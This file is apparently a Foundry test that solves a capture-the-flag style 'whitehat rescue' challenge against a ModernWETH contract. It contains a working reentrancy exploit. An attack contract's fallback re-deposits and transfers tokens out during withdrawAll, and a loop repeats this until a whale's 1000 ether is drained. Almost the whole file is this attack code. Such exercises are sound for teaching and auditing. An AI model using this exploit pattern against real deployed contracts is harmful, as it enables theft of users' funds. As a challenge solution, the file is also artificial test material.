// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract AttackContract {
    ModernWETH public modernWETH;
    address public whitehat;
    constructor(ModernWETH _modernWETH, address _whitehat) {
        whitehat = _whitehat;
        modernWETH = _modernWETH;
    }

    function attack() public {
        // Step 2. attackContract will withdraw all modernWETH
        modernWETH.withdrawAll();
    }

    fallback() external payable {
        // Step 3. attackContract receive Ether, deposit to modernWETH and transfer out of this account. 
        // When execution goes back to modernWETH it will burn balance of attackContract, however the balance is 0 because of the transfer out.
        modernWETH.deposit{value: msg.value}();
        console.log("DEPOSIT: %s", msg.value / 1e18);
        console.log("Transfer: %s", modernWETH.balanceOf(address(this)) / 1e18);
        modernWETH.transfer(whitehat, modernWETH.balanceOf(address(this)));

    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/
        AttackContract attackContract = new AttackContract(modernWETH, whitehat);
        modernWETH.deposit{value: 10 ether}();
        
        // Step 1. send modernWETH to attackContract
        for (; modernWETH.balanceOf(whitehat) < 1010 ether; ) {
            modernWETH.transfer(address(attackContract), 10 ether);
            attackContract.attack();
            console.log("After attack() WETH balance attackContract: %s", modernWETH.balanceOf(whitehat)/1e18);
        }
        // Step 4. Repeat until our balance is expected 1010 ether
        // Step 5. withdraw all our ether from modernWETH
        modernWETH.withdrawAll();
        //==================================================//
        vm.stopPrank();

        assertEq(address(modernWETH).balance, 0, "ModernWETH balance should be 0");
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(address(whitehat).balance, 1010 ether, "whitehat should end with 1010 ether");
    }
}
